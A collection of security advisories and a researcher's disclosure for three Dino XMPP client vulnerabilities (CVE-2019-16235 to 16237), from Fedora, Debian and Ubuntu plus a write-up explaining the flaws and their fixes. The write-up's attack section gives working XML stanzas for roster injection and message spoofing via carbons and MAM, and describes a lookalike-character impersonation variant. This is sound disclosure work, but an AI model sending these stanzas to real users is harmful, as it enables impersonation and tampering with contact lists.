* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ.mbox.gz?message=WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ/#WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ)

# [SECURITY] Fedora 29 Update: dino-0.0-0.12.20190912.git.a96c801.fc29

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

19 Sep
2019

19 Sep
'19

8:34 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2019-0eb6d51f81
2019-09-20 01:33:15.991594
--------------------------------------------------------------------------------

Name : dino
Product : Fedora 29
Version : 0.0
Release : 0.12.20190912.git.a96c801.fc29
URL : <https://github.com/dino/dino>
Summary : Modern XMPP ("Jabber") Chat Client using GTK+/Vala
Description :
A modern XMPP ("Jabber") chat client using GTK+/Vala.

--------------------------------------------------------------------------------
Update Information:

Update dino to
[a96c8014](<https://github.com/dino/dino/compare/016ab2c1...a96c8014>), which
addresses three CVEs. CVE-2019-16235 ============== Dino did not properly
check the source of message carbons.
<https://nvd.nist.gov/vuln/detail/CVE-2019-16235> Fixed in
<https://github.com/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930>
CVE-2019-16236 ========== Dino did not check roster push authorization.
<https://nvd.nist.gov/vuln/detail/CVE-2019-16236> Fixed in
<https://github.com/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9>
CVE-2019-16237 ========== Dinot did not properly check the source of MAM
messages. <https://nvd.nist.gov/vuln/detail/CVE-2019-16237> Fixed in
<https://github.com/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363>
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #1751851 - CVE-2019-16237: dino does not properly check the source of an MAM messages
<https://bugzilla.redhat.com/show_bug.cgi?id=1751851>
[ 2 ] Bug #1751849 - CVE-2019-16236: dino does not check roster push authorization
<https://bugzilla.redhat.com/show_bug.cgi?id=1751849>
[ 3 ] Bug #1751847 - CVE-2019-16235: Dino before does not properly check the source of a carbons
<https://bugzilla.redhat.com/show_bug.cgi?id=1751847>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2019-0eb6d51f81' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ/#WZBNQAOBWTIOKNO4PIYNX624ACGUXSXQ)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from gultsch.de_ad4e3bfe_20250121_005011.html ===


[Daniel Gultsch](https://gultsch.de)

# Multiple Vulnerabilities found in Dino

**CVE-2019-16235+:** Missing or incorrect sender validations in [Dino](https://dino.im) allow an attacker to spoof messages and inject or remove entries from the userâs roster.

## Introduction

Dino is a Jabber/XMPP client written in Vala and GTK. On September 10th 2019, while chatting on a public channel, a number of vulnerabilities were discovered in Dino. The discovery was initially prompted by a user of the name *balu\_der\_bÃ¤r* who was deliberately sending fake [Message Carbons](https://xmpp.org/extensions/xep-0280.html) to the channel. This quickly led to the diagnosis that Dino was not properly verifying the sender of a Message Carbon before parsing it (CVE-2019-16235). Message Carbons are only valid if they are coming from the userâs account. This vulnerability is an exact replica of the vulnerabilities already described in [CVE-2017-5589+](https://seclists.org/oss-sec/2017/q1/373) that were discovered in February 2017 in multiple Jabber/XMPP clients.

Subsequent testing brought two more vulnerabilities to the surface that generally fall into the same category of faulty sender validation.

Dino does not verify the sender of [Roster Pushes](https://tools.ietf.org/html/rfc6121#section-2.1.6) and allows any third party to modify the roster (CVE-2019-16236). This is the same issue that in December 2015 has already been discovered in the Jabber/XMPP client Gajim ([CVE-2015-8688](https://gultsch.de/gajim_roster_push_and_message_interception.html)).

A third issue, that hasnât been observed prior to that in other clients, is a lack of sender validation for Message Archive Management (CVE-2019-16237). This allows an attacker to send messages in the name of someone else.

## Attack

The following XML snippets can be used to test if a client is vulnerable to the aforementioned attacks.

### Roster Injection

This will put the attackerâs Jabber ID under the name *significant other* into the victims roster.

```
<iq type="set" to="victim@example.com/r" from="attacker@example.com/r" id="test">
  <query xmlns="jabber:iq:roster">
    <item subscription="both" jid="attacker@example.com"
      name="significant other"/>
  </query>
</iq>
```

**Update:** A variation of this attack would first delete the roster entry of thirdparty@â¦ and then replace it with an entry for thiÐ³dpÐ°Ð³ty@â¦ (Note the Cyrillic Ð³ and the Ð°). In most clients that would look almost identical to the victim and trick the victim into thinking they are talking to *thirdparty* while they are really talking to the attacker. The Android client [Conversations](https://conversations.im) does have some protection agains that and would [highlight irregular Unicode script](https://twitter.com/iNPUTmice/status/977137069460922369) to warn the user of this kind of impersonation attack.

### Message spoofing (Carbons)

This will present the victim with a message that appears to be coming from *so@example.com*.

```
<message to='victim@example.com' from='attacker@example.com/r' type='chat'>
  <received xmlns='urn:xmpp:carbons:2'>
    <forwarded xmlns='urn:xmpp:forward:0'>
      <message xmlns="jabber:client"
        to='victim@example.com'
        from='so@example.com'>
        <body>I have a surprise for you.</body>
      </message>
    </forwarded>
  </received>
</message>
```
### Message spoofing (MAM)

This will present the victim with a message that appears to be coming from *so@example.com*.

```
<message to='victim@example.com' from='attacker@example.com/r' type='chat'>
  <result xmlns='urn:xmpp:mam:2' queryid='0' id='whatever'>
    <forwarded xmlns='urn:xmpp:forward:0'>
      <message xmlns="jabber:client"
        to='victim@example.com'
        from='so@example.com'>
        <delay xmlns='urn:xmpp:delay' stamp='2019-09-12T23:42:05Z'/>
        <body>I have a surprise for you.</body>
      </message>
    </forwarded>
  </result>
</message>
```
## Mitigation

Before parsing a roster push or a Message Carbon Dino needs to make sure that the stanzas are coming from the bare account Jabber ID. (See [RFC6121 Section 2.1.6](https://tools.ietf.org/html/rfc6121#section-2.1.6) and [XEP-0280: Message Carbons - Security Considerations](https://xmpp.org/extensions/xep-0280.html#security))

The mitigation described in [CVE-2015-8688 Gajim Roster Push Attack / Message Interception](https://gultsch.de/gajim_roster_push_and_message_interception.html) mentions Gajimâs use of predictable resources and how unpredictable resources would have made it harder to modify the roster of someone the attacker doesnât have presence subscription with. Dino does in fact use partially randomized resources and therefor a trivial (non brute force) attack is limited to attackers with mutual presence subscription. Alternatively it is also enough if attacker and victim are in the same group chat (MUC). The latter is possible due to the fact that most group chats will route IQ stanzas among participants.

When requesting archived messages from a service the client has to make sure that they are coming from the same service before parsing them. Usually, when requesting the archive for oneâs own account, the sender is the account. However when requesting messages from a group chat (MUC) the sender has to match the Jabber ID of the group. In addition to that archival messages will be tagged with a randomized, client set query-id that a can be compared to any running queries. Unexpected archival messages that are either received while no MAM query is running or that donât match the query-id should be ignored.

## Evaluation

Even though this was the first time that message spoofing over MAM has been publicly documented there is reason to believe that this is not due to MAM being less likely to be affected but rather due to the relatively low adoption rate of MAM. One evidence for this theory is that [Converse.js](https://conversejs.org/) has also pushed [MAM fixes](https://github.com/conversejs/converse.js/commit/35e97c23538c7747bb3d78d0172b934f4d629068) shortly after the public discovery of the Dino vulnerability.

When confronted with the fact that the same trivial vulnerabilities have been discovered in multiple, independent clients one can not avoid the question if there is a more fundamental issue underneath that causes different developers to all make the same mistakes.

Both RFC6121 and XEP-0280 mention that the sender has to be checked. However evidently that hasnât been enough. On September 11th the [XMPP Council voted in an amendment](https://github.com/xsf/xeps/pull/822) to XEP-0280 that explicitly mentions the problem in the [Receiving Messages](https://xmpp.org/extensions/xep-0280.html#inbound) section. This also includes an example on what type of messages need to be ignored.

As of today (September 12th) XEP-0313: Message Archive Management has no such explicit warning.

Noteworthy in this context is [XEP-0409: IM Routing-NG](https://xmpp.org/extensions/xep-0409.html) which, in the mid-term, might replace Message Carbons. IM Routing-NG has the potential of being easier to implement and generally less error prone while simultaneously fixing some UX issues of Message Carbons.

## Timeline

* 2019/09/10: Discovery
* 2019/09/10: Fixed in Git ([CVE-2019-16235](https://github.com/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930), [CVE-2019-16236](https://github.com/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9), [CVE-2019-16237](https://github.com/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363))
* 2019/09/11: XSF Council [amended XEP-0280 with additional warnings](https://github.com/xsf/xeps/pull/822)



=== Content from www.debian.org_788df1fd_20250121_005015.html ===


---

[[Date Prev](msg00171.html)][[Date Next](msg00173.html)]
[[Thread Prev](msg00171.html)][[Thread Next](msg00173.html)]
[[Date Index](maillist.html#00172)]
[[Thread Index](threads.html#00172)]

# [SECURITY] [DSA 4524-1] dino-im security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4524-1] dino-im security update
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Mon, 16 Sep 2019 19:46:42 +0000
* *Message-id*: <[[🔎]](/msgid-search/20190916194642.4q66qfpbppqz7kpl%40seger.debian.org) [20190916194642.4q66qfpbppqz7kpl@seger.debian.org](msg00172.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4524-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
September 16, 2019                    <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : dino-im
CVE ID         : CVE-2019-16235 CVE-2019-16236 CVE-2019-16237

Multiple vulnerabilities have been discovered in the Dino XMPP client,
which could allow spoofing message, manipulation of a user's roster
(contact list) and unauthorised sending of message carbons.

For the stable distribution (buster), these problems have been fixed in
version 0.0.git20181129-1+deb10u1.

We recommend that you upgrade your dino-im packages.

For the detailed security status of dino-im please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/dino-im>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAl1/5m4ACgkQEMKTtsN8
TjZoew//VzHzRJugquWiQMLE3U9FZ5gxST5PHZELo2Dra/dG/ZwCDEmN2D5LJQdw
y/mS5E8X7jxiDIBQkbbXqPlZZ2vMZYw/WM0uu8X1OyzVM2yk/TBaq2bhi81J4SCy
Nd87xICSAZFkfRAE8E97+PSvT8nPJ3BkqcFm59NrShPyS4rhc091E2pkYlGbOwCS
CTdenMWkJXlSZBwmg2zUoLWp7asGlM35OggZEVoexim+3hGO6mm15sejqH4TzuRa
UdwbsO/TtQhBsj/BDmnPfXwkjkwoM40xr2Yko+HD3QzZCQ4oE2SQ37weu9qB2UU3
qBLB0wsvD5JMwq4mEZYsB//WAMPt875WujEl85Z19ri0TEWUHSKCvtcUdlnAigiQ
YL6GkwwVRN3+mHKUvs4u4+kvuO2Uyr0aPjki0nKMTJp+aLPhug3xgGWuyGlX0BIT
0B5XW+BMEj/N4ynVN+1Z5EkfuzkrArwTs3cZlCJi5ILXO8iNBPhIbRFJxUUkbUv2
0bScafddSNVk2EyLPYo1vvNdMiq5hKr12jvgfX+Jq++XpJX5KPMHEHWZ03HqHfjF
avneQfQYGsyhyq1MmCNxzY/gLZ3DKh7yv+Tg0BbeC/UDTDjs41IgVquRlickHbI6
5D6JZMQCJDk9ShOwSPKF60DkER7E/Tga/r/ryjw1K3ftwfG30nw=
=93xm
-----END PGP SIGNATURE-----

```

---



=== Content from usn.ubuntu.com_90429ca6_20250121_005014.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4306-1: Dino vulnerabilities

17 March 2020

Several security issues were fixed in dino-im.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.04 ESM](/security/notices?release=bionic)

## Packages

* [dino-im](/security/cves?package=dino-im) - modern XMPP client

## Details

It was discovered that Dino incorrectly validated inputs. An attacker could use

this issue to possibly obtain, inject or remove sensitive information.

This update also includes a fix to the encryption implementation in Dino to

support 12 byte IVs, in addition to 16 byte IVs.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.04

* [dino-im](https://launchpad.net/ubuntu/%2Bsource/dino-im)
  -
  [0.0.git20180130-1ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/dino-im/0.0.git20180130-1ubuntu0.1)
* [dino-im-common](https://launchpad.net/ubuntu/%2Bsource/dino-im)
  -
  [0.0.git20180130-1ubuntu0.1](https://launchpad.net/ubuntu/%2Bsource/dino-im/0.0.git20180130-1ubuntu0.1)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2019-16235](/security/CVE-2019-16235)
* [CVE-2019-16236](/security/CVE-2019-16236)
* [CVE-2019-16237](/security/CVE-2019-16237)
* <https://bugs.launchpad.net/bugs/1866115>

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from lists.ubuntu.com_6d4c2b2e_20250121_025950.html ===

[![](http://assets.ubuntu.com/sites/ubuntu/latest/u/img/logos/logo-ubuntu-orange.png)
Mailing lists](http://community.ubuntu.com/)

# Mailing Lists

Below is a listing of all the public mailing lists on lists.ubuntu.com. Click on a list name to get more information about the list, or to subscribe, unsubscribe, and change the preferences on your subscription.

List administrators, you can visit [the list admin overview page](https://lists.ubuntu.com/mailman/admin) to find the management interface for your list.

If you need help with your Ubuntu system, please try one of the [Community Support Lists](#Community+Support) below.
If you are having trouble using the lists themselves, please contact mailman@lists.ubuntu.com.

**Categories**

1. [Ubuntu Announcements](#Ubuntu+Announcements)
2. [Community Support](#Community+Support)
3. [Announcement Lists](#Announcement+Lists)
4. [Development Lists](#Development+Lists)
5. [Quality Assurance and Related Lists](#Quality+Assurance+and+Related+Lists)
6. [Bug Lists](#Bug+Lists)
7. [Package Upload and Automatic Notification Lists](#Package+Upload+and+Automatic+Notification+Lists)
8. [Ubuntu Worldwide LoCo Teams](#Ubuntu+Worldwide+LoCo+Teams)
9. [Localization Lists](#Localization+Lists)
10. [Other Ubuntu Projects and Groups](#Other+Ubuntu+Projects+and+Groups)
11. [Bazaar-related Lists](#Bazaar-related+Lists)
12. [Storm Lists](#Storm+Lists)
13. [Discontinued (Historical) Lists](#Discontinued+%28Historical%29+Lists)

## Ubuntu Announcements

* [ubuntu-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-announce) -
  Ubuntu Announcements

## Community Support

* [ubuntu-users](http://lists.ubuntu.com/mailman/listinfo/ubuntu-users) -
  Ubuntu user technical support, not for general discussions
* [edubuntu-users](http://lists.ubuntu.com/mailman/listinfo/edubuntu-users) -
  Edubuntu Users Help and Discussion
* [kubuntu-users](http://lists.ubuntu.com/mailman/listinfo/kubuntu-users) -
  Kubuntu user technical support
* [launchpad-users](http://lists.ubuntu.com/mailman/listinfo/launchpad-users) -
  Discussion for Launchpad users
* [lubuntu-users](http://lists.ubuntu.com/mailman/listinfo/Lubuntu-users) -
